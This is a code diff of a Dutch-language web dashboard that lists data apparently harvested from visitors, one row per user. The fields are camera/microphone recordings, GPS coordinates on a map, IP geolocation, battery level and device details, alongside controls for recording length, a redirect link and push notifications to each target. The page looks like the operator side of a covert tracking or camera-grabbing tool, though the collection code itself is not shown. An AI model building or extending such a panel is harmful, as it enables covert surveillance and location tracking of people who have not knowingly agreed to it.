@@ -21,7 +21,7 @@
             box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
             padding: 30px;
             width: 100%;
-            max-width: 900px; /* Increased max-width */
+            max-width: 1200px; /* Wider container */
         }
         h2 {
             color: #333;
@@ -89,22 +89,22 @@
         }
         .input-field {
             width: 100%;
-            padding: 8px; /* Reduced padding */
+            padding: 8px;
             border: 1px solid #ddd;
             border-radius: 6px;
             box-sizing: border-box;
-            font-size: 0.9rem; /* Slightly smaller font */
+            font-size: 0.9rem;
         }
         .save-button, #trigger-redirect, .send-user-notification-button {
             background-color: #007bff;
             color: white;
-            padding: 10px 16px; /* Reduced padding */
+            padding: 10px 16px;
             border: none;
             border-radius: 6px;
             cursor: pointer;
-            font-size: 0.9rem; /* Smaller font */
+            font-size: 0.9rem;
             transition: background-color 0.3s ease;
-            margin-top: 10px; /* Reduced margin */
+            margin-top: 10px;
             display: inline-block;
             text-decoration: none;
             text-align: center;
@@ -113,13 +113,13 @@
             background-color: #0056b3;
         }
         .data-section {
-            margin-top: 20px; /* Reduced margin */
+            margin-top: 20px;
             border-top: 1px solid #eee;
-            padding-top: 20px; /* Reduced padding */
+            padding-top: 20px;
         }
         .data-section h3 {
             color: #333;
-            margin-bottom: 15px; /* Reduced margin */
+            margin-bottom: 15px;
         }
         .data-table {
             width: 100%;
@@ -129,10 +129,10 @@
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
         }
         .data-table th, .data-table td {
-            padding: 8px 10px; /* Reduced padding */
+            padding: 8px 10px;
             border-bottom: 1px solid #eee;
             text-align: left;
-            font-size: 0.9rem; /* Smaller font */
+            font-size: 0.9rem;
         }
         .data-table th {
             background-color: #f9f9f9;
@@ -151,21 +151,21 @@
             display: none;
         }
         .explanation {
-            font-size: 0.8rem; /* Even smaller explanation font */
+            font-size: 0.8rem;
             color: #777;
             margin-left: auto;
-            margin-right: 10px; /* Reduced margin */
+            margin-right: 10px;
             font-style: italic;
         }
         .error-message {
             color: #dc3545;
-            margin-top: 10px; /* Reduced margin */
+            margin-top: 10px;
             font-weight: bold;
             font-size: 0.9rem;
         }
         #success-message {
             color: #00a86b;
-            margin-top: 10px; /* Reduced margin */
+            margin-top: 10px;
             display: none;
             font-weight: bold;
             font-size: 0.9rem;
@@ -173,11 +173,32 @@
 
         /* Style for the map container */
         #location-map {
-            height: 200px; /* Reduced map height */
+            height: 200px;
             width: 100%;
             border: 1px solid #ddd;
             border-radius: 4px;
         }
+
+        /* Notification cell styling */
+        .notification-cell {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start; /* Align items to the start */
+            gap: 5px; /* Add some spacing between elements */
+        }
+
+        .notification-cell input[type='text'],
+        .notification-cell input[type='file'] {
+            margin-bottom: 5px; /* Spacing for inputs */
+            width: 100%; /* Input fields take full width */
+            max-width: 200px; /* Limit input field width if needed */
+        }
+
+        .notification-cell button.send-user-notification-button {
+            margin-top: 5px; /* Spacing for button */
+        }
+
+
     </style>
 
     <!-- Leaflet CSS -->
@@ -196,7 +217,7 @@
     <div class="container">
         <h2>Instellingen</h2>
 
-        <!-- Settings -->
+        <!-- Settings Toggles -->
         <div class="setting-row">
             <label class="toggle-switch">
                 <input type="checkbox" id="mic-cam-permission">
@@ -224,7 +245,7 @@
              <p id="notification-explanation" class="explanation hidden">Notificatie toestemming.</p>
         </div>
 
-
+        <!-- Global Input Fields -->
         <div class="input-row">
             <label for="message-text">Standaardbericht (optioneel):</label>
             <input type="text" id="message-text" class="input-field" placeholder="Voer een bericht in">
@@ -245,29 +266,42 @@
             <input type="number" id="record-seconds" class="input-field" placeholder="Bijv. 10" min="0">
         </div>
 
-
         <button class="save-button" id="save-settings">Instellingen Opslaan</button>
 
-        <!-- Trigger for redirect (link or button) -->
+        <!-- Trigger for redirect -->
          <a href="redirect.html" id="trigger-redirect">Ga naar Redirect</a>
 
-        <!-- Success Message -->
+        <!-- Success/Error Messages -->
         <p id="success-message">Instellingen succesvol opgeslagen!</p>
+        <p id="error-message" class="error-message" style="display: none;"></p>
+
 
           <!-- Data Section -->
         <div class="data-section">
             <h3 id="data-table-title" class="editable-title" data-original-title="Verzamelde Gegevens:">Verzamelde Gegevens:</h3>
-             <p id="error-message" class="error-message" style="display: none;"></p>
             <table class="data-table">
                 <thead>
                     <tr>
-                        <th>Titel</th>
-                        <th>Waarde</th>
-                        <th>Stuur Notificatie</th>  <!-- Replaced Notification Status and Action with combined column -->
+                        <th>User ID</th>
+                        <th>Opname</th>
+                        <th>Latitude</th>
+                        <th>Longitude</th>
+                        <th>Locatie Nauwkeurigheid</th>
+                        <th>Locatie op Kaart</th>
+                        <th>IP Adres</th>
+                        <th>IP Stad</th>
+                        <th>IP Regio</th>
+                        <th>IP Land</th>
+                        <th>Battery Percentage</th>
+                        <th>Locatie Fout</th>
+                        <th>Batterij Fout</th>
+                        <th>Camera/Microfoon Fout</th>
+                        <th>Device Informatie</th>
+                        <th>Stuur Notificatie</th> <!-- Notification Column -->
                     </tr>
                 </thead>
                 <tbody id="data-list">
-                    <!-- Data rows will be added here dynamically -->
+                    <!-- User data rows will be added here -->
                 </tbody>
             </table>
         </div>
@@ -311,7 +345,6 @@ const dataTableTitleElement = document.getElementById("data-table-title");
 
 let currentUserId = "user1";
 
-
 // --- Firestore References (DYNAMIC USER ID) ---
 async function getNextUserId() {
     const counterRef = db.collection('counters').doc('userCounter');
@@ -338,120 +371,33 @@ async function getNextUserId() {
 }
 
 
-// Add an item to the data table
-function addDataItem(userId, title, value, isVideo = false, isMap = false) {
-    const row = document.createElement('tr');
-    const titleCell = document.createElement('td');
-    const valueCell = document.createElement('td');
-    const notificationCell = document.createElement('td'); // Combined notification column
-    const notificationTitleInput = document.createElement('input');
-    const notificationBodyInput = document.createElement('input');
-    const notificationIconButton = document.createElement('input'); // File input button
-    const sendButton = document.createElement('button');
-    const iconUrlHiddenInput = document.createElement('input');
-
-    notificationTitleInput.type = 'text';
-    notificationTitleInput.placeholder = 'Notificatie Titel';
-    notificationTitleInput.className = 'input-field';
-    notificationBodyInput.type = 'text';
-    notificationBodyInput.placeholder = 'Notificatie Bericht';
-    notificationBodyInput.className = 'input-field';
-    notificationIconButton.type = 'file';
-    notificationIconButton.accept = 'image/*';
-    notificationIconButton.className = 'save-button'; // style as button visually
-    iconUrlHiddenInput.type = 'hidden';
-    iconUrlHiddenInput.id = `notification-icon-url-${userId}`;
-
-
-    sendButton.textContent = "Stuur Notificatie";
-    sendButton.className = 'send-user-notification-button';
-
-    sendButton.addEventListener('click', () => sendNotificationForUser(userId, notificationTitleInput.value, notificationBodyInput.value, iconUrlHiddenInput.value));
-
-    notificationIconButton.addEventListener('change', async (event) => {
-        const file = event.target.files[0];
-        if (!file) return;
-
-        const storageRef = storage.ref();
-        const iconRef = storageRef.child(`notificationIcons/${userId}_${Date.now()}_${file.name}`);
-
-        try {
-            await iconRef.put(file);
-            const uploadedIconUrl = await iconRef.getDownloadURL();
-            iconUrlHiddenInput.value = uploadedIconUrl; // Store URL in hidden input
-
-        } catch (uploadError) {
-            console.error("Error uploading notification icon:", uploadError);
-            errorMessage.textContent = `Fout bij uploaden notificatie icoon: ${uploadError.message}`;
-            errorMessage.style.display = 'block';
+// Utility function to promisify Geolocation API
+function getCurrentPositionPromise() {
+    return new Promise((resolve, reject) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(resolve, reject);
+        } else {
+            reject(new Error("Geolocation is not supported"));
         }
     });
-
-
-    notificationCell.appendChild(notificationTitleInput);
-    notificationCell.appendChild(notificationBodyInput);
-    notificationCell.appendChild(notificationIconButton);
-    notificationCell.appendChild(iconUrlHiddenInput); // Hidden input to store URL
-    notificationCell.appendChild(sendButton);
-
-
-    titleCell.textContent = title;
-    titleCell.classList.add('editable');
-    titleCell.setAttribute('data-original-title', title);
-
-
-    if (isVideo) {
-        valueCell.appendChild(value);
-    } else if (isMap) {
-        valueCell.appendChild(value);
-    } else {
-        valueCell.textContent = value;
-    }
-
-
-    titleCell.addEventListener('click', function() {
-        const originalTitle = this.getAttribute('data-original-title');
-        const newTitle = prompt("Bewerk de titel:", originalTitle);
-        if (newTitle !== null && newTitle.trim() !== "") {
-            this.textContent = newTitle.trim();
-            this.setAttribute('data-original-title', newTitle.trim());
-        }
-    });
-
-    row.appendChild(titleCell);
-    row.appendChild(valueCell);
-    row.appendChild(notificationCell); // Append the combined notification cell
-    dataList.appendChild(row);
 }
 
-
-   // Utility function to promisify Geolocation API
-    function getCurrentPositionPromise() {
-        return new Promise((resolve, reject) => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(resolve, reject);
-            } else {
-                reject(new Error("Geolocation is not supported"));
-            }
-        });
-    }
-
-     // Utility function to promisify Battery API
-    function getBatteryPromise() {
-        return new Promise((resolve, reject) => {
-            if(navigator.getBattery) {
-               resolve(navigator.getBattery());
-            }else{
-                reject(new Error("Battery API is not supported."));
-            }
-        });
+ // Utility function to promisify Battery API
+function getBatteryPromise() {
+    return new Promise((resolve, reject) => {
+        if(navigator.getBattery) {
+           resolve(navigator.getBattery());
+        }else{
+            reject(new Error("Battery API is not supported."));
+        }
+    });
 
     }
+
 
 // Load settings AND data from Firestore
 async function loadSettingsAndData(userId) {
     const settingsRef = db.collection('userSettings').doc(userId);
-    const dataRef = db.collection('userData').doc(userId);
 
     try {
         const settingsSnap = await settingsRef.get();
@@ -466,11 +412,7 @@ async function loadSettingsAndData(userId) {
             recordSeconds.value = settingsData.recordSeconds || '0';
         }
          updateExplanations();
-
-        // Load collected data - ALWAYS load data for the given userId
-        const dataSnap = await dataRef.get();
-        const userData = dataSnap.data() || {};
-        displayData(userId, userData); // Pass userId to displayData
+         loadAllUserData(); // Load all user data after settings
 
     } catch (error) {
         console.error("Error loading settings/data:", error);
@@ -528,100 +470,188 @@ async function saveSettings() {
 }
 
 
-// Display data in the table (NOW WITH EXTRA CHECKS)
-async function displayData(userId, data) {
-    dataList.innerHTML = '';
-    errorMessage.style.display = 'none';
+// Function to display all user data in the table (ONE ROW PER USER)
+async function displayData(userId, userData) {
+    let row = document.getElementById(`user-row-${userId}`); // Try to find existing row
 
-    console.log("Data received in displayData:", data);
+    if (!row) { // If row doesn't exist, create it
+        row = document.createElement('tr');
+        row.id = `user-row-${userId}`; // Set row ID
+        dataList.appendChild(row);
+    } else {
+         row.innerHTML = ''; // Clear existing row content if row exists
+    }
 
 
-    try {
-        if (data.videoUrl) {
-            const videoElement = document.createElement('video');
-            videoElement.src = data.videoUrl;
-            videoElement.controls = true;
-            videoElement.style.width = '100%';
-            addDataItem(userId, "Opname", videoElement, true);
+    // --- Create cells for each data point ---
+    const userIdCell = document.createElement('td');
+    userIdCell.textContent = userId;
+    row.appendChild(userIdCell);
+
+    const videoCell = document.createElement('td');
+    if (userData.videoUrl) {
+        const videoElement = document.createElement('video');
+        videoElement.src = userData.videoUrl;
+        videoElement.controls = true;
+        videoElement.style.width = '100%';
+        videoCell.appendChild(videoElement);
+    } else {
+        videoCell.textContent = 'Geen data';
+    }
+    row.appendChild(videoCell);
+
+
+    const locationDataPoints = ['Latitude', 'Longitude', 'Locatie Nauwkeurigheid'];
+    const locationKeys = ['latitude', 'longitude', 'accuracy'];
+    locationDataPoints.forEach((title, index) => {
+        const cell = document.createElement('td');
+        if (userData.location && userData.location[locationKeys[index]]) {
+             let value = userData.location[locationKeys[index]];
+             if(locationKeys[index] !== 'accuracy'){
+                 value = value.toFixed(4);
+             }else{
+                  value = `±${value.toFixed(0)} meter`;
+             }
+            cell.textContent = value;
+
         } else {
-            addDataItem(userId, "Opname", "Geen data", false);
-            console.log("No videoUrl found in data.");
+            cell.textContent = 'Geen data';
         }
+        row.appendChild(cell);
+    });
 
-        if (data.location) {
-            addDataItem(userId, "Latitude", data.location.latitude.toFixed(4));
-            addDataItem(userId, "Longitude", data.location.longitude.toFixed(4));
-            if(data.location.accuracy){
-                addDataItem(userId, "Locatie Nauwkeurigheid", `±${data.location.accuracy.toFixed(0)} meter`);
-            }
+    const locationMapCell = document.createElement('td');
+     if (userData.location && userData.location.latitude && userData.location.longitude) {
+            const mapContainer = document.createElement('div');
+            mapContainer.id = `location-map-${userId}`; // Unique map ID per user
+            mapContainer.className = 'location-map'; // Apply CSS class
+            locationMapCell.appendChild(mapContainer);
 
-            if (data.location.latitude && data.location.longitude) {
-                const mapContainer = document.createElement('div');
-                mapContainer.id = 'location-map';
-                addDataItem(userId, "Locatie op Kaart", mapContainer, false, true);
-
-                const map = L.map('location-map').setView([data.location.latitude, data.location.longitude], 15);
-
+            // Use setTimeout to initialize Leaflet map after the container is in DOM
+            setTimeout(() => {
+                const map = L.map(`location-map-${userId}`).setView([userData.location.latitude, userData.location.longitude], 15);
                 L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                     attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                 }).addTo(map);
-
-                L.marker([data.location.latitude, data.location.longitude]).addTo(map)
+                L.marker([userData.location.latitude, userData.location.longitude]).addTo(map)
                     .bindPopup('<b>Huidige Locatie</b>').openPopup();
-            }
+            }, 0); // Delay map init
         } else {
-            addDataItem(userId, "Locatie", "Geen data", false);
-            console.log("No location found in data.");
+            locationMapCell.textContent = 'Geen data';
         }
+    row.appendChild(locationMapCell);
 
-        if (data.ipLocation) {
-            addDataItem(userId, "IP Adres", data.ipLocation.ip);
-            addDataItem(userId, "IP Stad", data.ipLocation.city);
-            addDataItem(userId, "IP Regio", data.ipLocation.region);
-            addDataItem(userId, "IP Land", data.ipLocation.country);
+
+    const ipLocationDataPoints = ['IP Adres', 'IP Stad', 'IP Regio', 'IP Land'];
+    const ipLocationKeys = ['ip', 'city', 'region', 'country'];
+    ipLocationDataPoints.forEach((title, index) => {
+        const cell = document.createElement('td');
+        cell.textContent = userData.ipLocation ? (userData.ipLocation[ipLocationKeys[index]] || 'Geen data') : 'Geen data';
+        row.appendChild(cell);
+    });
+
+    const batteryCell = document.createElement('td');
+    batteryCell.textContent = userData.batteryPercentage ? `${userData.batteryPercentage.toFixed(0)}%` : 'Geen data';
+    row.appendChild(batteryCell);
+
+    const errorDataPoints = ['Locatie Fout', 'Batterij Fout', 'Camera/Microfoon Fout', 'Device Informatie'];
+    const errorKeys = ['locationError', 'batteryError', 'cameraError', 'deviceInfo'];
+    errorDataPoints.forEach((title, index) => {
+        const cell = document.createElement('td');
+        cell.textContent = userData[errorKeys[index]] || 'Geen data';
+        row.appendChild(cell);
+    });
+
+
+    // --- Create Notification Cell (Combined Column) ---
+    const notificationCell = document.createElement('td');
+    notificationCell.className = 'notification-cell'; // Apply CSS class for styling
+
+    const notificationTitleInput = document.createElement('input');
+    notificationTitleInput.type = 'text';
+    notificationTitleInput.placeholder = 'Notificatie Titel';
+    notificationTitleInput.className = 'input-field';
+    notificationTitleInput.value = userData.notificationTitle || ''; // Pre-fill if available
+
+    const notificationBodyInput = document.createElement('input');
+    notificationBodyInput.type = 'text';
+    notificationBodyInput.placeholder = 'Notificatie Bericht';
+    notificationBodyInput.className = 'input-field';
+    notificationBodyInput.value = userData.notificationBody || ''; // Pre-fill if available
+
+    const notificationIconButton = document.createElement('input'); // File input button
+    notificationIconButton.type = 'file';
+    notificationIconButton.accept = 'image/*';
+    notificationIconButton.className = 'save-button'; // style as button visually
+    const iconUrlHiddenInput = document.createElement('input');
+    iconUrlHiddenInput.type = 'hidden';
+    iconUrlHiddenInput.id = `notification-icon-url-${userId}`;
+    iconUrlHiddenInput.value = userData.notificationIcon || ''; // Pre-fill icon URL
+
+
+    const sendButton = document.createElement('button');
+    sendButton.textContent = "Stuur Notificatie";
+    sendButton.className = 'send-user-notification-button';
+
+
+    sendButton.addEventListener('click', () => sendNotificationForUser(userId, notificationTitleInput.value, notificationBodyInput.value, iconUrlHiddenInput.value));
+
+
+     notificationIconButton.addEventListener('change', async (event) => {
+        const file = event.target.files[0];
+        if (!file) return;
+
+        const storageRef = storage.ref();
+        const iconRef = storageRef.child(`notificationIcons/${userId}_${Date.now()}_${file.name}`);
+
+        try {
+            await iconRef.put(file);
+            const uploadedIconUrl = await iconRef.getDownloadURL();
+            iconUrlHiddenInput.value = uploadedIconUrl; // Store URL in hidden input
+
+
+        } catch (uploadError) {
+            console.error("Error uploading notification icon:", uploadError);
+            errorMessage.textContent = `Fout bij uploaden notificatie icoon: ${uploadError.message}`;
+            errorMessage.style.display = 'block';
+        }
+    });
+
+
+    notificationCell.appendChild(notificationTitleInput);
+    notificationCell.appendChild(notificationBodyInput);
+    notificationCell.appendChild(notificationIconButton);
+    notificationCell.appendChild(iconUrlHiddenInput); // Hidden input to store URL
+    notificationCell.appendChild(sendButton);
+
+    row.appendChild(notificationCell); // Append notification cell to row
+
+
+}
+
+
+// Function to load all user data and display the table (ONE ROW PER USER)
+async function loadAllUserData() {
+    dataList.innerHTML = ''; // Clear the table body
+
+    const userDataCollection = db.collection('userData');
+
+    try {
+        const snapshot = await userDataCollection.get();
+        if (!snapshot.empty) {
+            snapshot.forEach(doc => {
+                const userId = doc.id;
+                const userData = doc.data();
+                displayData(userId, userData); // Display data for each user
+            });
         } else {
-             addDataItem(userId, "IP Locatie", "Geen data", false);
-            console.log("No IP location found in data.");
-        }
-
-
-        if (data.batteryPercentage) {
-            addDataItem(userId, "Battery Percentage", `${data.batteryPercentage.toFixed(0)}%`);
-        } else{
-            addDataItem(userId, "Battery Percentage", "Geen data", false);
-            console.log("No batteryPercentage found in data")
-        }
-
-        if (data.locationError) {
-            addDataItem(userId, "Locatie Fout", data.locationError);
-        } else{
-            addDataItem(userId, "Locatie Fout", "Geen data", false);
-            console.log("No location error found in data")
-        }
-
-        if (data.batteryError) {
-            addDataItem(userId, "Batterij Fout", data.batteryError);
-        }else{
-            addDataItem(userId, "Batterij Fout", "Geen data", false);
-            console.log("No Battery error found in data")
-        }
-        if (data.cameraError) {
-            addDataItem(userId, "Camera/Microfoon Fout", data.cameraError);
-        }else{
-            addDataItem(userId, "Camera/Microfoon Fout", "Geen data", false);
-            console.log("No camera error found in data")
-        }
-        if (data.deviceInfo) {
-            addDataItem(userId, "Device Informatie", data.deviceInfo);
-        } else {
-            addDataItem(userId, "Device Informatie", "Geen data", false);
-            console.log("No device info found in data");
+            dataList.innerHTML = '<tr><td colspan="16" style="text-align:center;">Geen gebruikersdata gevonden.</td></tr>';
         }
 
 
     } catch (error) {
-        console.error("Error displaying data:", error);
-        errorMessage.textContent = `Fout bij weergeven data: ${error.message}`;
+        console.error("Error fetching all user data:", error);
+        errorMessage.textContent = `Fout bij laden gebruikersdata: ${error.message}`;
         errorMessage.style.display = 'block';
     }
 }
@@ -639,7 +669,7 @@ async function sendNotificationForUser(targetUserId, notificationTitle, notifica
     if (!notificationTitle || !notificationBody) {
         errorMessage.textContent = "Notificatie titel en bericht zijn niet ingesteld voor deze gebruiker.";
         errorMessage.style.display = 'block';
-        return; // Stop if title or body is missing
+        return;
     }
 
     try {
